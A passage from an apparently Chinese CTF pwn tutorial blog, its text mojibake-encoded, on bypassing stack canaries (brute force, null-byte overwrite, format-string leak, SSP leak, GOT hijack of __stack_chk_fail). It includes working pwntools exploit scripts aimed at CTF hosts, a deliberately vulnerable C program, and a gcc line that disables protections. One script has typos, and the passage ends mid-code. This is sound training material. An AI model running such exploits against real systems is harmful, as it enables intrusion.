alt="image-20230530154247901"></p><p>å‘ç°å‡½æ•°å…¥å£ä¸º0x122D å¹¶ä¸”å‘ç°â€&#x2F;bin&#x2F;cat flagâ€ æ¥ä¸‹æ¥æ‰¾æº¢å‡ºä½ç½®çˆ†ç ´cannary</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154947024.png" alt="image-20230530154947024"></p><p>æ˜æ˜¾æº¢å‡º å®šä½è¯¥å‡½æ•°sub_128Aï¼ˆçˆ†ç ´canaryçš„ä½ç½®ï¼‰çˆ†ç ´æˆåŠŸåçˆ†è¿”å›åœ°å€ ï¼ˆçˆ†canaryåœ°å€çš„ä¸‹ä¸€ä½ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530155540402.png" alt="image-20230530155540402"></p><p>å‡½æ•°å…¥å£ä¸º0x122D shellè¿”å›åœ°å€ä¸º1329 åç§»ä¸º0xfc(0x1329-0x122D) è¦†ç›–çš„bufå¤§å°ä¸º0x68</p><p><strong>tips</strong><br>ã€1ã€‘canaryå¤§å°ä¸º0x00-0xff æ‰€ä»¥çˆ†ç ´æ—¶æ¯å­—èŠ‚éœ€å¾ªç¯257æ¬¡ åˆå› ä¸ºcanaryä½ä¸‰ä½å®šä¸º\x00ï¼ˆ32ä½çˆ†ç ´å¾ªç¯3æ¬¡ 64ä½å¾ªç¯7æ¬¡ï¼‰æ­¤å¤„éœ€å¾ªç¯7æ¬¡<br>ã€2ã€‘ç¨‹åºå…¥å£ç‚¹ä¸€èˆ¬éƒ½æ˜¯æ•´æ•°ï¼Œå³åœ°å€æœ€ä½ä½ä¸º00ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„åœ°å€ï¼Œ0x29æ˜¯å¯ä¿¡çš„ã€‚å°±åªè¦çˆ†ç ´åä¸€ä½å°±OKï¼Œå†åé¢çš„åœ°å€éƒ½ç›¸åŒï¼Œçˆ†ä¸çˆ†éƒ½ä¸€æ ·ã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   </span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./fun&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;39.106.65.236&quot;, &quot;30687&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>) </span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="comment">#canary</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  info(<span class="string">f&#x27;No:<span class="subst">&#123;K+<span class="number">1</span>&#125;</span>start,finding...&#x27;</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">     p.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>)+cannary+btyes([i]))</span><br><span class="line">     recv = p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>)</span><br><span class="line">     <span class="keyword">if</span> <span class="string">b&quot;have fun&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">      cannary += <span class="built_in">bytes</span>([i])</span><br><span class="line">      success(<span class="string">f&quot;canary =&gt; <span class="subst">&#123;canary.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">#return address</span></span><br><span class="line">re_1 = <span class="number">0x29</span></span><br><span class="line">re_2 = <span class="number">0</span></span><br><span class="line">info(<span class="string">&#x27;finding:re_2 ...&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> re_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p8(re_1) + p8(re_i)</span><br><span class="line"><span class="comment">#p8()å°†ç»™å®šçš„æ•´æ•°è½¬æ¢ä¸ºå•å­—èŠ‚çš„å­—èŠ‚ä¸²</span></span><br><span class="line">  p.send(payload)</span><br><span class="line">  recv = p.recvuntil(<span class="string">b&quot;welcome\n&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">b&quot;have fun&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">       re_2 = re_i</span><br><span class="line">       success(<span class="string">f&quot;re_2 =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(re_2)&#125;</span>&quot;</span>)</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span>-<span class="number">8</span>) + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p8(re_1 - <span class="number">1</span>) + p8(re_2 - <span class="number">1</span>)<span class="comment">#-1å¯¹é½æ ˆ</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="äºŒã€è¦†ç›–æˆªæ–­å­—ç¬¦ï¼ˆ-x00ï¼‰è·å–canary"><a href="#äºŒã€è¦†ç›–æˆªæ–­å­—ç¬¦ï¼ˆ-x00ï¼‰è·å–canary" class="headerlink" title="äºŒã€è¦†ç›–æˆªæ–­å­—ç¬¦ï¼ˆ\x00ï¼‰è·å–canary"></a>äºŒã€è¦†ç›–æˆªæ–­å­—ç¬¦ï¼ˆ\x00ï¼‰è·å–canary</h4><p>æ€è·¯ï¼š<br>$æ„é€ ç¬¬ä¸€æ¬¡æº¢å‡ºï¼Œè¦†ç›–canaryçš„ä½å­—èŠ‚\x00ï¼Œè¯»å‡ºcanaryçš„å€¼.<br>$æ„é€ ç¬¬äºŒæ¬¡æº¢å‡ºï¼Œåˆ©ç”¨è·å–çš„canaryæ„é€ payloadï¼Œget shell.<br>ã€babypieã€‘<br>ï¼ˆ1ï¼‰checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628164526442.png" alt="image-20230628164526442"></p><p>ï¼ˆ2ï¼‰IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628170950596.png" alt="image-20230628170950596"></p><p>  ä¸¤æ¬¡readæº¢å‡º</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628171033720.png" alt="image-20230628171033720"></p><p>NXæ‰“å¼€æœ‰å¯åˆ©ç”¨çš„systemï¼ˆâ€&#x2F;bin&#x2F;shâ€ï¼‰<br>PIEæ‰“å¼€åä½åœ°å€å§‹ç»ˆä¸å˜ï¼Œå¯ä»¥ç¢°è¿æ°”ï¼ˆbuhsi(â—â€™â—¡â€™â—)ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628172653111.png" alt="image-20230628172653111"></p><p>canaryä»¥\x00ç»“å°¾ï¼ˆä¸ºé˜²æ­¢è¢«è¯»å‡ºï¼‰é‚£æˆ‘ä»¬å°±æº¢å‡ºè¦†ç›–\x00å†é€šè¿‡printå‡½æ•°æ‰“å°å‡ºcanary<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628173716094.png" alt="image-20230628173716094"></p><p>0x30-0x8 &#x3D; 40ï¼Œå†+1è¦†ç›–\x00<br>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh = process(&#x27;./babypie&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29536</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x29</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å…ˆæ•´canary</span></span><br><span class="line">sh.sendafter(<span class="string">b&#x27;Input your Name:\n&#x27;</span>,payload)</span><br><span class="line">sh.recv(<span class="number">6</span> + <span class="number">40</span>)<span class="comment">#è¯»å–6ä¸ªå­—èŠ‚ï¼ˆå³ç¨‹åºçš„å›åº”æ¶ˆæ¯ï¼‰å’Œ40ä¸ªå­—èŠ‚ï¼ˆå³ç¨‹åºè¿”å›çš„canaryå€¼ï¼‰</span></span><br><span class="line">canary = u64(sh.recv(<span class="number">8</span>)) &amp; (<span class="number">0xffffffffffffff00</span>)<span class="comment">#æœ«å°¾æ¸…0ä»¥ä¿æŒä¸ç¨‹åºå†…éƒ¨çš„å­—èŠ‚å¯¹é½</span></span><br><span class="line">log.success(<span class="string">&#x27;canary:%x \n&#x27;</span>,canary)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span> + p64(canary)  + p64(<span class="number">0</span>)+ <span class="string">b&#x27;\x42&#x27;</span></span><br><span class="line"><span class="comment">#p64(0)å°†æ ˆä¸Šçš„è¿”å›åœ°å€æ›¿æ¢ä¸º0ï¼Œä»è€Œç»•è¿‡å†…å­˜ä¿æŠ¤æœºåˆ¶</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="ä¸‰ã€åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–canary"><a href="#ä¸‰ã€åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–canary" class="headerlink" title="ä¸‰ã€åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–canary"></a><strong>ä¸‰ã€åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–canary</strong></h4><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å¯ä»¥æ‰“å°å‡ºæ ˆä¸­å†…å®¹ï¼Œç›®æ ‡åˆ©ç”¨æ­¤æ¼æ´æ‰“å°å‡ºcanaryå€¼ï¼Œå†åˆ©ç”¨æº¢å‡ºè¿›è¡Œæ”»å‡».<br>ã€Mary_Mortonã€‘<br>ï¼ˆ1ï¼‰checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628202654542.png" alt="image-20230628202654542"></p><p>ï¼ˆ2ï¼‰IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204047171.png" alt="image-20230628204047171"></p><p>å¿«ä¹<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204121367.png" alt="image-20230628204121367"></p><p> è®¡ç®—åç§»å–½<br>                                      <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204702697.png" alt="image-20230628204702697"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204720325.png" alt="image-20230628204720325"></p><p>bufä¸canaryè·ç¦» 0x90 - 0x8 &#x3D; 0x88(136)   2^8+1 &#x3D; 17ä¸ªå†…å­˜å•å…ƒ<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210551449.png" alt="image-20230628210551449"></p><p>canaryä¸printfæ ¼å¼åŒ–å­—ç¬¦ä¸²å½¢å‚ç›¸å¯¹åç§»ä¸º17+6 &#x3D; 23<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210759817.png" alt="image-20230628210759817"></p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p=process(&#x27;./mary&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="number">63174</span>)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&quot;battle \n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%23$p&quot;</span>)</span><br><span class="line">tmp=<span class="built_in">int</span>(p.recv(),<span class="number">16</span>)</span><br><span class="line">canary=p64(tmp)</span><br><span class="line"> </span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*(<span class="number">0x88</span>)+canary+p64(<span class="number">0</span>)+p64(<span class="number">0x4008DA</span>)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&quot;3.&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="å››ã€SSP-Leakåˆ©ç”¨canary"><a href="#å››ã€SSP-Leakåˆ©ç”¨canary" class="headerlink" title="å››ã€SSP Leakåˆ©ç”¨canary"></a><strong>å››ã€SSP Leakåˆ©ç”¨canary</strong></h4><p>æ€è·¯ï¼š<br>$canaryæ£€æµ‹å¤±è´¥ä¼šè§¦å‘stack_chk_faliå‡½æ•°é€ æˆstack smashingï¼ˆstack smashing protect leakï¼‰<br>$stack_chk_failå‡½æ•°ä¼šè¾“å‡ºä¸€æ®µæŠ¥é”™æ˜¾ç¤ºæ–‡ä»¶åï¼Œè¦†ç›–æ–‡ä»¶åæŒ‡é’ˆï¼Œä»è€Œå®ç°ä»»æ„è¯»ä¹Ÿå°±æ˜¯è¦†ç›–å˜é‡__libc_argv[0]<br>$åˆ©ç”¨ç›¸åº”å‡½æ•°è¿›è¡Œæº¢å‡ºï¼ˆputsã€readã€writeï¼‰å¾—åˆ°libcbase å¾—å‡ºå…³é”®åœ°å€è¿›è¡Œæ”»å‡»</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) __stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) internal_function __fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminatedn&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦†ç›–åˆ°argvå°±å¯è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„å‚æ•°ï¼ˆå³åˆ©ç”¨äº†canaryçš„æŠ¥é”™ä¿¡æ¯ï¼‰</p><p>ä¸åŒçš„libcå¯¹äº__fortify_failå®ç°æœ‰å·®å¼‚ï¼Œä¸‹é¢æ˜¯glibcçš„å®ç°<br><a href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/debug/fortify_fail.c">githubæºç ï¼šglibc&#x2F;debug&#x2F;fortify_fail.c</a><br>ã€2018ç½‘é¼æ¯ Guessã€‘<br>(1)checsksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628135719174.png" alt="image-20230628135719174"></p><p>(2)IDAåˆ†æ<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628142542077.png" alt="image-20230628142542077"></p><p>ï¼ˆ3ï¼‰åˆ©ç”¨stack samshingåŸç† gdbè°ƒè¯•æ‰¾åˆ°argv[0]è®¡ç®—åç§»<br>é€šè¿‡è¦†ç›–libc_argv[0]çš„å†…å®¹è§¦å‘canaryä¿æŠ¤å°†è¦†ç›–å†…å®¹è¿›è¡Œè¾“å‡º<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628143124351.png" alt="image-20230628143124351"></p><p>åœ¨mainå‡½æ•°ä½ç½®ä¸‹æ–­ç‚¹ rsiå¤„ä¸ºargv[0]åœ°å€(0x7fffffffdfc87)<br>libcä¸­æœ‰ä¸€ä¸ªå˜é‡environï¼Œå‚¨å­˜ç€æ ˆåœ°å€ åªè¦å¾—åˆ°libcåŸºå€ï¼Œå°±å¯ä»¥ç®—å‡ºè¿™ä¸ªå˜é‡çš„åœ°å€ï¼Œå†æ¬¡ç”¨__stack_chk_failè¯»å–è¿™ä¸ªå˜é‡å°±å¯ä»¥å¾—åˆ°æ ˆçš„ä¸€ä¸ªåœ°å€ï¼Œå°±èƒ½è®¡ç®—å‡ºè¯»è¿›æ¥çš„flagçš„åœ°å€ï¼Œä»è€Œå†æ¬¡ç”¨stack smashè¯»å–flag</p><p>ç¬¬ä¸€æ¬¡ï¼Œæˆ‘ä»¬æ³„éœ²å‡½æ•°çš„gotè¡¨å†…å®¹ï¼Œå¾—åˆ°glibcåœ°å€ã€‚å¾—åˆ°glibcåœ°å€ï¼Œæ˜¯ä¸ºäº†è®¡ç®—å‡ºstack_endå˜é‡çš„åœ°å€ï¼Œè¿›è€Œï¼Œç¬¬äºŒæ¬¡ï¼Œæˆ‘ä»¬æ³„éœ²æ ˆåœ°å€ï¼Œè®¡ç®—å‡ºflagå­˜æ”¾çš„åœ°å€ï¼Œäºæ˜¯ï¼Œç¬¬ä¸‰æ¬¡ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ³„éœ²flagçš„å€¼ã€‚</p><p>getså‡½æ•°ä¸‹æ–­ç‚¹  è°ƒè¯•è®¡ç®—åç§»0xfc8-0xea0ï¼ˆ0x128ï¼‰ã€è¿˜éœ€è¿›ä¸€æ­¥æ·±å…¥ç†è§£ã€‘</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628161126662.png" alt="image-20230628161126662"></p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./GUESS&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27922</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./GUESS&#x27;)</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>(<span class="params">content</span>):</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(content)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;*** stack smashing detected ***: &#x27;</span>)</span><br><span class="line">    addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># step1: leak puts_addr</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(puts_got)</span><br><span class="line">puts_plt = leak_addr(payload1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_plt-----&gt;&quot;</span> + <span class="built_in">hex</span>(puts_plt))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_plt)</span><br><span class="line">libc_base = puts_plt - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base-----&gt;&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">environ = libc.dump(<span class="string">&#x27;__environ&#x27;</span>) + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2: leak environ</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(environ)</span><br><span class="line">environ_addr = leak_addr(payload2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;enviorn in stack-----&gt;&quot;</span> + <span class="built_in">hex</span>(environ_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3: leak flag</span></span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(environ_addr-<span class="number">0x168</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Please type your guessing flag\n&#x27;</span>,payload3)</span><br><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="äº”ã€åŠ«æŒstack-chk-failå‡½æ•°æ³„éœ²canary"><a href="#äº”ã€åŠ«æŒstack-chk-failå‡½æ•°æ³„éœ²canary" class="headerlink" title="äº”ã€åŠ«æŒstack_chk_failå‡½æ•°æ³„éœ²canary"></a>äº”ã€åŠ«æŒstack_chk_failå‡½æ•°æ³„éœ²canary</h4><p>æ€è·¯ï¼šåŠ«æŒstack_chk_failï¼Œå¯ä»¥ä¿®æ”¹å…¨å±€åç§»è¡¨(GOT)ä¸­å­˜å‚¨çš„_stack_chk_failå‡½æ•°åœ°å€ï¼Œåœ¨è§¦å‘canaryæ£€æŸ¥å¤±è´¥æ—¶ï¼Œè·³è½¬åˆ°æŒ‡å®šçš„åœ°å€ç»§ç»­æ‰§è¡Œ.</p><p>ç™¾åº¦æ¯flagenå…¶å®å¯ä»¥åšæ›´å¥½çš„æ —å­ ç›®å‰æš‚æœªè·å–åˆ°ç›¸å…³æ–‡ä»¶ ä»¥åæœ‰æœºä¼šå¡«å‘ğŸ˜Š</p><p>æœ‰ç›¸å…³æ–‡ç« [(12æ¡æ¶ˆæ¯) [pwn]ROPï¼šä¸‰é“é¢˜è®²è§£èŠ±å¼ç»•è¿‡Canaryæ ˆä¿æŠ¤_breezeO_oçš„åšå®¢-CSDNåšå®¢](<a href="https://blog.csdn.net/Breeze_CAT/article/details/100086513?ops_request_misc=%7B%22request_id%22:%22168796009416800197015252%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168796009416800197015252&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-100086513-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=%E7%99%BE%E5%BA%A6%E6%9D%AF">https://blog.csdn.net/Breeze_CAT/article/details/100086513?ops_request_misc=%7B%22request%5Fid%22%3A%22168796009416800197015252%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=168796009416800197015252&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-100086513-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=ç™¾åº¦æ¯</a> flagen&amp;spm&#x3D;1018.2226.3001.4187)</p><p>è‡ªå·±æ•´ä¸ªå°ç®€å•ğŸ¤–<br><strong>æ¼æ´ä»£ç </strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">175</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">275</span>);#æ ˆæº¢å‡º</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦æƒ³æˆåŠŸåŠ«æŒå‡½æ•°ä¿®æ”¹gotè¡¨ éœ€å…³é—­relro<br>è°ƒç”¨shellå‡½æ•°éœ€è¦å…³é—­pie</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc <span class="selector-tag">a</span><span class="selector-class">.c</span> -m32 -fstack-protector -no-pie -z noexecstack -z norelro -o <span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">offset=<span class="number">10</span></span><br><span class="line">scf_got=ELF(<span class="string">&#x27;a&#x27;</span>).got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line">gs_addr=ELF(<span class="string">&#x27;a&#x27;</span>).sym[<span class="string">&#x27;getshell&#x27;</span>]</span><br><span class="line">exp=fmtstr_payload(offset, &#123;scf_got: gs_addr&#125;)</span><br><span class="line">sh.send(exp+<span 